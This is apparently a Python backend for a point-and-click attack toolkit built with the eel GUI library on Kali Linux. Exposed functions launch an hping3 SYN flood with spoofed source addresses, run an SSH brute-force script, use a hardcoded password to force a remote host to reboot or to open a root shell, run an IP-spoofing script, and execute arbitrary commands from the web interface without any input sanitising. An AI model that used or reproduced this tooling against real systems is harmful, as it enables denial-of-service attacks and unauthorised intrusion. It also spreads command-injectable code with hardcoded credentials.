import os
import eel
import  subprocess
import sys
eel.init("web")
should_continue_execution = True
sys.stdout = open(os.devnull, "w")
@eel.expose
def stop_execution():
    global should_continue_execution
    should_continue_execution = False
@eel.expose
def ping(targetip):
    
    global should_continue_execution
    #output=os.system("ping {0}".format(targetip))
    output = subprocess.check_output("ping {0}".format(targetip), shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    return output
    if not should_continue_execution:
        return None
@eel.expose
def dos(target):
    os.system("echo 'kali' | sudo -S -k setcap cap_net_raw+ep /usr/sbin/hping3")
    os.system("hping3 -S --flood -d 50000 --rand-source {0}".format(target))
    print("dos is done")

@eel.expose
def sshbrute(target):
    os.system("echo '{0}' | python sshbrute.py".format(target))
    os.system("sshpass -p '123456' ssh -o 'StrictHostKeyChecking no' joe@192.168.1.105 'echo '123456' | sudo -S -k shutdown -r 0'".format(target))
    print("sshbrute done")

@eel.expose
def sshcmd(target):
    os.system("sshpass -p '123456' ssh joe@{0} 'echo '123456' | sudo -S -k /bin/bash'".format(target))
    print("ssh and cmd done")

@eel.expose
def ipspoof(target):
    attakerip = subprocess.check_output("ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | tr -s '\r\n' ' '", shell=True).decode()
    os.system("echo 'kali' | sudo -S -k python /media/sf_Shara-Kali/cybersimplev3/ipspoof.py {1} {0} 1337".format(target,attakerip))

@eel.expose
def run_command(command):
    # Run the command and capture the output
    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    return output


eel.start("index.html", size=(1280,800), cmdline_args=['--disable-translate'])